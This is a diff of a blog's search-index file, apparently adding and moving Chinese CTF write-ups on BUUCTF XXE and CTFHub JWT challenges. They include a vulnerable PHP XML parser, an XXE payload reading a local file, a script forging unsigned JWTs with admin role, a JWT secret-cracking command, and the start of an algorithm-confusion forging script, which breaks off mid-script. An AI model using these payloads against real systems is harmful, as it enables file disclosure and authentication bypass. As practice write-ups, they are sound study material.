@@ -410,92 +410,6 @@ AddHandler cgi-script .cgi   <span aria-hidden="true" class="line-numbers-rows">
       </tags>
   </entry>
   <entry>
-    <title>xxe</title>
-    <url>/2023/07/XXE/</url>
-    <content><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码	</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onclick<span class="token operator">=</span><span class="token string">"XMLFunction()"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述">抓包看xml格式<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
-        <span class="token keyword">function</span> <span class="token function">XMLFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">var</span> xml <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span>
-                <span class="token string">'&lt;?xml version="1.0" encoding="UTF-8"?>'</span> <span class="token operator">+</span>
-            <span class="token string">'&lt;root>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;username>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/username>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;password>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/password>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;/root>'</span><span class="token punctuation">;</span>
-            <span class="token keyword">var</span> xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">if</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    <span class="token function">alert</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-                <span class="token punctuation">&#125;</span>
-            <span class="token punctuation">&#125;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"login.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>构造xxe攻击<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述">这是post包<code>传的时候记得把注释删去</code></p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY flag SYSTEM "file:///flag"><span class="token comment">&lt;!--构造实体--></span>
-</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--输出flag实体--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>2333<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
-<p><img src= "/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token comment">/**
-* autor: c0ny1
-* date: 2018-2-7
-*/</span>
-
-<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
-<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
-<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
-
-<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
-	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
-	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>
-
-	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>	
-<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>有admin密码了也没用<br>藏内网了，上次比赛ssrf题出过</p>
-<ul>
-<li>etc&#x2F;hosts </li>
-<li>proc&#x2F;net&#x2F;arp<br><img src= "/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
-</ul>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xxe</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfhub-rce</title>
     <url>/2023/07/ctfhub-rce/</url>
     <content><![CDATA[<p>rce：远程代码执行漏洞<br>分为远程命令执行ping和远程代码执行evel。<br><strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞</strong>。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
@@ -633,6 +547,92 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
         <tag>web</tag>
         <tag>ctfhub</tag>
         <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe</title>
+    <url>/2023/07/XXE/</url>
+    <content><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码	</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onclick<span class="token operator">=</span><span class="token string">"XMLFunction()"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述">抓包看xml格式<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
+        <span class="token keyword">function</span> <span class="token function">XMLFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">var</span> xml <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span>
+                <span class="token string">'&lt;?xml version="1.0" encoding="UTF-8"?>'</span> <span class="token operator">+</span>
+            <span class="token string">'&lt;root>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;username>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/username>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;password>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/password>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;/root>'</span><span class="token punctuation">;</span>
+            <span class="token keyword">var</span> xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token function">alert</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"login.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>构造xxe攻击<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述">这是post包<code>传的时候记得把注释删去</code></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY flag SYSTEM "file:///flag"><span class="token comment">&lt;!--构造实体--></span>
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--输出flag实体--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>2333<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
+<p><img src= "/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+* autor: c0ny1
+* date: 2018-2-7
+*/</span>
+
+<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
+<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
+	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>	
+<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>有admin密码了也没用<br>藏内网了，上次比赛ssrf题出过</p>
+<ul>
+<li>etc&#x2F;hosts </li>
+<li>proc&#x2F;net&#x2F;arp<br><img src= "/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
+</ul>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xxe</tag>
+        <tag>buuctf</tag>
       </tags>
   </entry>
   <entry>
@@ -794,6 +794,104 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       </tags>
   </entry>
   <entry>
+    <title>ctfhub-jwt</title>
+    <url>/2023/07/jwt/</url>
+    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">jwt基础知识</a></p>
+<p>flag在下面</p>
+<p>需要了解一下jwt组成部分</p>
+<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>随便输个</p>
+<p>进去查消息头</p>
+<p>然后在</p>
+<p><a href="https://jwt.io/">jwt.io</a></p>
+<p>decode	一共两部分ag是另一半<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254077114-40.png" alt="请添加图片描述"></p>
+<h1 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt
+algorithm<span class="token operator">=</span><span class="token string">"none"</span>
+payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+  <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+  <span class="token string">"role"</span><span class="token punctuation">:</span><span class="token string">"admin"</span>
+  <span class="token punctuation">&#125;</span>
+key <span class="token operator">=</span> <span class="token string">""</span>
+encoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>key<span class="token punctuation">,</span>algorithm<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>jwt的签名可以为无</p>
+<blockquote>
+<p>今天写这个脚本的时候命名为jwt.py</p>
+<p>结果报错 但是系统环境运行正常</p>
+<p>才知道是文件名的事</p>
+<p>import jwt 他先自己引用自己了</p>
+</blockquote>
+<p>抓包</p>
+<p>把cookie里的token改为这脚本的运行结果</p>
+<h1 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h1><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker">jwt-cracker</a></p>
+<p>依次执行即可</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/brendan-rius/c-jwt-cracker
+./c-jwt-cracker
+<span class="token function">make</span>
+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后得出该jwt密钥</p>
+<p>然后放之前那个网站</p>
+<p>改role为admin</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254081515-43.png" alt="请添加图片描述"></p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254083805-46.png" alt="请添加图片描述">返回提交token<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254086176-49.png" alt="请添加图片描述"></p>
+<h1 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h1><p>把cookie清空后提交用户名密码</p>
+<p>得到一串jwt</p>
+<p>丢进<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254091115-52.png" alt="请添加图片描述"><br>发现是RS256编码（不对称式编码)</p>
+<p>需要改为对称式编码</p>
+<p>如HS256</p>
+<p>题目中给了public key</p>
+<p>用PUBLIC_KEY采用HS256进行加密payload构造token</p>
+<p>借用<a href="https://blog.csdn.net/loseheart157">大神h0ld1rs</a>的脚本</p>
+<blockquote>
+<p>无签名那段脚本</p>
+<p>是勉勉强强写出来的</p>
+<p>这题就先用大神的脚本吧</p>
+<p>我太菜了</p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=GBK</span>
+<span class="token keyword">import</span> hmac
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> base64
+
+<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'publickey.pem'</span><span class="token punctuation">)</span><span class="token comment">#需要将文中的publickey下载	与脚本同目录</span>
+key <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Paste your header and payload here</span>
+header <span class="token operator">=</span> <span class="token string">'&#123;"typ": "JWT", "alg": "HS256"&#125;'</span>
+payload <span class="token operator">=</span> <span class="token string">'&#123;"username": "admin", "role": "admin"&#125;'</span>
+
+<span class="token comment"># Creating encoded header</span>
+encodeHBytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>header<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
